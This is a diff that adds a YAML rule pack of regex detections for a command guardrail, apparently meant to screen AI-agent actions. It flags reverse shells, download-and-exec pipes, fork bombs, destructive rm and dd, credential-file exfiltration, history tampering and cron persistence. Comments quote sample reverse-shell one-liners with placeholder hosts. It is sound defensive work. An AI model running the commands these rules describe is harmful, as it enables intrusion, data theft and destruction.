@@ -1,0 +1,180 @@
+# W.H.Agent rule pack — dangerous commands / runtime execution threats.
+#
+# Pattern-based detections shared by `scan`, `check`, and `guard`. Each rule is a
+# JavaScript regex (single-quoted so backslashes are literal). `profiles` lists
+# which guardrail profiles include the rule (default = all three). Keep patterns
+# HIGH-PRECISION — each should reference a hard signal (a /dev/tcp socket, nc -e,
+# pipe-to-interpreter, a named sensitive file) so benign dev commands don't trip.
+#
+# Tune locally by dropping a YAML file with the same shape into
+# ~/.wh-agent/rules/ or ./.wh-agent/rules/ (rules are added; list ids under a
+# top-level `suppress:` to disable built-ins).
+version: 1
+category: command
+rules:
+  - id: CMD-REVSHELL-DEVTCP
+    # /dev/tcp/<host>/<port> is bash's socket special file. Require an adjacent
+    # REDIRECTION/fd operator (`>&`, `<>`, `<`, `>`, optional fd number) — which
+    # every real reverse shell uses (`bash -i >& /dev/tcp/..`, `exec 3<>/dev/tcp/..`,
+    # `cat < /dev/tcp/..`) — so a mere mention of the path in a comment/prose
+    # ("we do NOT use /dev/tcp/host/443") is not flagged. Host form is unrestricted
+    # (IP, dotted name, or a bareword like localhost).
+    pattern: '(?:\d*(?:>&|<>|<|>))\s*/dev/(?:tcp|udp)/[^/\s]+/\d+'
+    title: Reverse shell / raw socket via /dev/tcp
+    severity: critical
+    confidence: 0.9
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-DUP2
+    # A socket file descriptor wired onto stdio (or a pty spawned onto a socket) is
+    # the defining move of a script-body reverse shell — catches the payload hidden
+    # in a Write/Edit of a .py/.js file, which no shell-invocation pattern sees.
+    pattern: '\bdup2\s*\(\s*\w+\.fileno\s*\(\s*\)'
+    title: Socket fd duplicated onto stdio (reverse shell)
+    severity: critical
+    confidence: 0.9
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-PTY-SPAWN
+    pattern: '\bpty\.spawn\s*\(\s*["'']/(?:usr/)?bin/(?:ba|z)?sh'
+    title: pty.spawn of a shell (reverse shell)
+    severity: critical
+    confidence: 0.85
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-MKFIFO
+    # mkfifo backpipe form: `mkfifo f; cat f | sh -i 2>&1 | nc host port > f`.
+    pattern: '\bmkfifo\b[\s\S]{0,120}?\|[\s\S]{0,60}?\b(?:nc|ncat|netcat|/bin/(?:ba|z)?sh|sh)\b'
+    flags: i
+    title: mkfifo backpipe reverse shell
+    severity: critical
+    confidence: 0.85
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-SHELL-NC
+    # Interactive shell piped to netcat: `sh -i 2>&1 | nc host port`.
+    pattern: '\b(?:ba|z)?sh\s+-i\b[\s\S]{0,60}?\|[\s\S]{0,40}?\b(?:nc|ncat|netcat)\b'
+    flags: i
+    title: Interactive shell piped to netcat (reverse shell)
+    severity: critical
+    confidence: 0.85
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-BASH-I
+    pattern: 'bash\s+-i\s+(?:>&|&>|2>&1)'
+    flags: i
+    title: Interactive bash redirected to a socket (reverse shell)
+    severity: critical
+    confidence: 0.9
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-NC
+    pattern: '\b(?:nc|ncat|netcat)\b[^\n|]*\s(?:-e|--exec|-c)\b'
+    flags: i
+    title: Netcat reverse shell (-e/--exec)
+    severity: critical
+    confidence: 0.9
+    tags: [execution, reverse-shell]
+
+  - id: CMD-REVSHELL-INTERPRETER
+    pattern: '\b(?:python[23]?|perl|ruby|php|node)\b\s+-\w+\b[^\n]*\bsocket\b[^\n]*(?:connect|SOCK_STREAM)'
+    flags: i
+    title: Interpreter one-liner reverse shell (socket connect)
+    severity: critical
+    confidence: 0.9
+    tags: [execution, reverse-shell]
+
+  - id: CMD-DOWNLOAD-EXEC-PIPE
+    pattern: '\b(?:curl|wget|fetch)\b[^\n|]*\|\s*(?:sudo\s+)?(?:[/\w.]+/)?(?:bash|zsh|sh|dash|python[23]?|node|perl|ruby)\b'
+    flags: i
+    title: Download piped directly to an interpreter (download-and-exec)
+    severity: critical
+    confidence: 0.95
+    tags: [execution, download-exec]
+
+  - id: CMD-DOWNLOAD-EXEC-SUBST
+    pattern: '\b(?:bash|sh|zsh)\b\s+<\(\s*(?:curl|wget|fetch)\b'
+    flags: i
+    title: Process-substitution download executed by a shell
+    severity: critical
+    confidence: 0.9
+    tags: [execution, download-exec]
+
+  - id: CMD-BASE64-EXEC
+    pattern: '\b(?:base64|openssl\s+enc|xxd)\b[^\n|]*(?:-d|--decode|-D)[^\n|]*\|\s*(?:[/\w.]+/)?(?:bash|zsh|sh|python[23]?|node|perl)\b'
+    flags: i
+    title: Base64/encoded payload decoded and piped to an interpreter
+    severity: critical
+    confidence: 0.9
+    tags: [execution, obfuscation]
+
+  - id: CMD-EVAL-DOWNLOAD
+    pattern: '\beval\b[^\n]*\$\(\s*(?:curl|wget|fetch)\b'
+    flags: i
+    title: eval of a downloaded command
+    severity: critical
+    confidence: 0.9
+    tags: [execution, download-exec]
+
+  - id: CMD-FORK-BOMB
+    pattern: ':\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:'
+    title: Classic shell fork bomb
+    severity: critical
+    confidence: 0.98
+    tags: [dos]
+
+  - id: CMD-RM-RF-ROOT
+    pattern: '\brm\s+(?:-[a-zA-Z]*\s+)*-[a-zA-Z]*[rf][a-zA-Z]*(?:\s+-[a-zA-Z]+)*\s+(?:--no-preserve-root\s+)?(?:/|/\*|~|\$HOME|/\s|"/"|''/'')(?:\s|$)'
+    title: Recursive force-delete of / or home (destructive)
+    severity: critical
+    confidence: 0.85
+    tags: [destructive]
+
+  - id: CMD-DISK-OVERWRITE
+    pattern: '\b(?:dd\s+[^\n]*of=/dev/(?:sd|nvme|disk|hd)|mkfs\.\w+\s+/dev/|>\s*/dev/(?:sd|nvme|disk)[a-z0-9]+)'
+    flags: i
+    title: Raw disk overwrite / reformat (destructive)
+    severity: critical
+    confidence: 0.9
+    tags: [destructive]
+
+  - id: CMD-CHMOD-WORLD-ROOT
+    pattern: '\bchmod\s+(?:-[a-zA-Z]*\s+)*(?:-R\s+)?0?777\s+(?:/|~|\$HOME)(?:\s|$)'
+    title: chmod 777 on / or home (privilege/permissions weakening)
+    severity: high
+    confidence: 0.85
+    tags: [permissions]
+
+  - id: CMD-CRED-FILE-EXFIL
+    pattern: '\b(?:curl|wget|scp|sftp|nc|ncat|rsync)\b[^\n]*(?:/etc/(?:passwd|shadow)|\.ssh(?:/|\b)|\.aws(?:/|\b)|\.gnupg(?:/|\b)|\.kube(?:/|\b)|id_[rd]sa\b|\.env\b|credentials\b|\.netrc\b)'
+    flags: i
+    title: Network command references a credential/secret file
+    severity: high
+    confidence: 0.8
+    tags: [exfiltration, credentials]
+
+  - id: CMD-HISTORY-TAMPER
+    pattern: '\b(?:unset\s+HISTFILE|export\s+HISTFILE=/dev/null|history\s+-c|set\s+\+o\s+history|HISTSIZE=0)\b'
+    title: Shell history tampering (anti-forensics)
+    severity: medium
+    confidence: 0.8
+    tags: [evasion]
+    profiles: [default, strict]
+
+  - id: CMD-CRONTAB-INJECT
+    pattern: '\b(?:crontab\s+-|echo\s+[^\n]*\|\s*crontab\b|/etc/cron\.d/|>>\s*/var/spool/cron)'
+    flags: i
+    title: Crontab / scheduled-task modification (persistence)
+    severity: medium
+    confidence: 0.7
+    tags: [persistence]
+    profiles: [default, strict]
+
+  - id: CMD-CURL-INSECURE
+    pattern: '\b(?:curl\s+[^\n]*(?:-k\b|--insecure)|wget\s+[^\n]*--no-check-certificate)'
+    flags: i
+    title: TLS verification disabled on a network fetch
+    severity: low
+    confidence: 0.6
+    tags: [network]
+    profiles: [strict]
